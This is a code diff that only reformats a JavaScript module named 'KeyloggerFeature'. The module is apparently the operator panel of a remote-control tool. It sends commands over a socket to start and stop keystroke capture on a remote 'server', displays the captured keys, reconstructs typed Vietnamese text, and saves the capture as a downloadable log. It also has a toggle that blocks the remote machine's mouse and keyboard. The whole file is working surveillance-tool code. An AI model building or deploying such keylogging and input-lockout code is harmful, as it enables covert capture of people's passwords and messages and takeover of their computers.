@@ -1,138 +1,152 @@
-import { SocketService } from '../services/socket.js';
-import { UIManager } from '../utils/ui.js';
-import { TelexEngine } from '../utils/telex.js';
+import { SocketService } from "../services/socket.js";
+import { UIManager } from "../utils/ui.js";
+import { TelexEngine } from "../utils/telex.js";
 
 // Input block toggle state
 let isInputBlocked = false;
 
 export const KeyloggerFeature = {
-    init() {
-        // 1. Lắng nghe log
-        SocketService.on('LOG', (data) => {
-            const text = data.payload || data;
-            if (text.startsWith("[Keylogger]")) {
-                this.processLogData(text.replace("[Keylogger] ", ""));
-            }
-        });
+  init() {
+    // 1. Lắng nghe log
+    SocketService.on("LOG", (data) => {
+      const text = data.payload || data;
+      if (text.startsWith("[Keylogger]")) {
+        this.processLogData(text.replace("[Keylogger] ", ""));
+      }
+    });
 
-        // 2. Gán sự kiện nút bấm
-        document.getElementById('btn-keylog-start')?.addEventListener('click', () => SocketService.send('START_KEYLOG'));
-        document.getElementById('btn-keylog-stop')?.addEventListener('click', () => SocketService.send('STOP_KEYLOG'));
-        document.getElementById('btn-keylog-clear')?.addEventListener('click', this.clearLogs);
-        document.getElementById('btn-keylog-download')?.addEventListener('click', this.downloadLogFile);
-        
-        // 3. Gán sự kiện cho nút Block/Unblock Input
-        const btnInputToggle = document.getElementById('btn-keylog-input-toggle');
-        if (btnInputToggle) {
-            btnInputToggle.addEventListener('click', () => this.toggleInputBlock());
-        }
-    },
+    // 2. Gán sự kiện nút bấm
+    document
+      .getElementById("btn-keylog-start")
+      ?.addEventListener("click", () => SocketService.send("START_KEYLOG"));
+    document
+      .getElementById("btn-keylog-stop")
+      ?.addEventListener("click", () => SocketService.send("STOP_KEYLOG"));
+    document
+      .getElementById("btn-keylog-clear")
+      ?.addEventListener("click", this.clearLogs);
+    document
+      .getElementById("btn-keylog-download")
+      ?.addEventListener("click", this.downloadLogFile);
 
-    processLogData(dataString) {
-        // Format: RawKey|||TranslatedChar
-        let rawKey = dataString;
-        let translatedChar = "";
-
-        if (dataString.includes("|||")) {
-            const parts = dataString.split("|||");
-            rawKey = parts[0];
-            translatedChar = parts[1];
-        }
-
-        // A. Render Raw Key (An toàn)
-        const rawContainer = document.getElementById("raw-key-output");
-        if (rawContainer) {
-            const span = document.createElement("span");
-            span.className = "key-badge";
-            span.textContent = rawKey; 
-            
-            // Thêm class màu mè
-            if (["Enter", "Back", "Delete", "Escape"].includes(rawKey)) span.classList.add("special");
-            if (rawKey.includes("Shift") || rawKey.includes("Control") || rawKey.includes("Alt")) span.classList.add("mod");
-            
-            rawContainer.appendChild(span);
-            rawContainer.scrollTop = rawContainer.scrollHeight;
-        }
-
-        // B. Update Editor dùng Telex Engine
-        if (translatedChar) {
-            const editor = document.getElementById("keylogger-editor");
-            if (editor) {
-                const oldVal = editor.value;
-                const newVal = TelexEngine.apply(oldVal, translatedChar);
-                editor.value = newVal;
-                editor.scrollTop = editor.scrollHeight;
-            }
-        }
-    },
-
-    clearLogs() {
-        const raw = document.getElementById("raw-key-output");
-        const editor = document.getElementById("keylogger-editor");
-        if(raw) raw.innerHTML = "";
-        if(editor) editor.value = "";
-        UIManager.showToast("Đã xóa dữ liệu Keylogger", "success");
-    },
-
-    downloadLogFile() {
-        const content = document.getElementById("keylogger-editor")?.value;
-        if (!content) return UIManager.showToast("Chưa có nội dung!", "error");
-
-        const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = url;
-        a.download = `Keylog_${Date.now()}.txt`;
-        document.body.appendChild(a);
-        a.click();
-        
-        setTimeout(() => {
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-        }, 100);
-    },
-
-    // Toggle Input Block/Unblock
-    toggleInputBlock() {
-        const btn = document.getElementById("btn-keylog-input-toggle");
-        const btnText = document.getElementById("btn-keylog-input-text");
-        const btnIcon = btn?.querySelector("i");
-
-        if (!isInputBlocked) {
-            // Block Input
-            if (confirm("Block mouse & keyboard on server?")) {
-                SocketService.send("DISABLE_INPUT");
-                isInputBlocked = true;
-
-                // Update button appearance
-                if (btn) {
-                    btn.className = "btn btn-sm btn-input-toggle me-1 is-blocked";
-                }
-                if (btnText) btnText.innerText = "Unblock";
-                if (btnIcon) btnIcon.className = "fas fa-lock";
-
-                UIManager.showToast("Input blocked", "warning");
-            }
-        } else {
-            // Unblock Input - Gửi nhiều lần để đảm bảo Windows unblock thành công
-            UIManager.showToast("Unblocking input...", "info");
-
-            // Gửi lệnh unblock 3 lần với delay để tăng tỷ lệ thành công
-            SocketService.send("ENABLE_INPUT");
-            setTimeout(() => SocketService.send("ENABLE_INPUT"), 300);
-            setTimeout(() => SocketService.send("ENABLE_INPUT"), 600);
-
-            isInputBlocked = false;
-
-            // Update button appearance
-            if (btn) {
-                btn.className = "btn btn-sm btn-input-toggle me-1";
-            }
-            if (btnText) btnText.innerText = "Block";
-            if (btnIcon) btnIcon.className = "fas fa-ban";
-
-            // Delay toast thành công để user thấy "Unblocking..."
-            setTimeout(() => UIManager.showToast("Input unblocked", "success"), 700);
-        }
+    // 3. Gán sự kiện cho nút Block/Unblock Input
+    const btnInputToggle = document.getElementById("btn-keylog-input-toggle");
+    if (btnInputToggle) {
+      btnInputToggle.addEventListener("click", () => this.toggleInputBlock());
     }
+  },
+
+  processLogData(dataString) {
+    // Format: RawKey|||TranslatedChar
+    let rawKey = dataString;
+    let translatedChar = "";
+
+    if (dataString.includes("|||")) {
+      const parts = dataString.split("|||");
+      rawKey = parts[0];
+      translatedChar = parts[1];
+    }
+
+    // A. Render Raw Key (An toàn)
+    const rawContainer = document.getElementById("raw-key-output");
+    if (rawContainer) {
+      const span = document.createElement("span");
+      span.className = "key-badge";
+      span.textContent = rawKey;
+
+      // Thêm class màu mè
+      if (["Enter", "Back", "Delete", "Escape"].includes(rawKey))
+        span.classList.add("special");
+      if (
+        rawKey.includes("Shift") ||
+        rawKey.includes("Control") ||
+        rawKey.includes("Alt")
+      )
+        span.classList.add("mod");
+
+      rawContainer.appendChild(span);
+      rawContainer.scrollTop = rawContainer.scrollHeight;
+    }
+
+    // B. Update Editor dùng Telex Engine
+    if (translatedChar) {
+      const editor = document.getElementById("keylogger-editor");
+      if (editor) {
+        const oldVal = editor.value;
+        const newVal = TelexEngine.apply(oldVal, translatedChar);
+        editor.value = newVal;
+        editor.scrollTop = editor.scrollHeight;
+      }
+    }
+  },
+
+  clearLogs() {
+    const raw = document.getElementById("raw-key-output");
+    const editor = document.getElementById("keylogger-editor");
+    if (raw) raw.innerHTML = "";
+    if (editor) editor.value = "";
+    UIManager.showToast("Đã xóa dữ liệu Keylogger", "success");
+  },
+
+  downloadLogFile() {
+    const content = document.getElementById("keylogger-editor")?.value;
+    if (!content) return UIManager.showToast("Chưa có nội dung!", "error");
+
+    const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `Keylog_${Date.now()}.txt`;
+    document.body.appendChild(a);
+    a.click();
+
+    setTimeout(() => {
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    }, 100);
+  },
+
+  // Toggle Input Block/Unblock
+  toggleInputBlock() {
+    const btn = document.getElementById("btn-keylog-input-toggle");
+    const btnText = document.getElementById("btn-keylog-input-text");
+    const btnIcon = btn?.querySelector("i");
+
+    if (!isInputBlocked) {
+      // Block Input
+      if (confirm("Block mouse & keyboard on server?")) {
+        SocketService.send("DISABLE_INPUT");
+        isInputBlocked = true;
+
+        // Update button appearance
+        if (btn) {
+          btn.className = "btn btn-sm btn-input-toggle me-1 is-blocked";
+        }
+        if (btnText) btnText.innerText = "Unblock";
+        if (btnIcon) btnIcon.className = "fas fa-lock";
+
+        UIManager.showToast("Input blocked", "warning");
+      }
+    } else {
+      // Unblock Input - Gửi nhiều lần để đảm bảo Windows unblock thành công
+      UIManager.showToast("Unblocking input...", "info");
+
+      // Gửi lệnh unblock 3 lần với delay để tăng tỷ lệ thành công
+      SocketService.send("ENABLE_INPUT");
+      setTimeout(() => SocketService.send("ENABLE_INPUT"), 300);
+      setTimeout(() => SocketService.send("ENABLE_INPUT"), 600);
+
+      isInputBlocked = false;
+
+      // Update button appearance
+      if (btn) {
+        btn.className = "btn btn-sm btn-input-toggle me-1";
+      }
+      if (btnText) btnText.innerText = "Block";
+      if (btnIcon) btnIcon.className = "fas fa-ban";
+
+      // Delay toast thành công để user thấy "Unblocking..."
+      setTimeout(() => UIManager.showToast("Input unblocked", "success"), 700);
+    }
+  },
 };
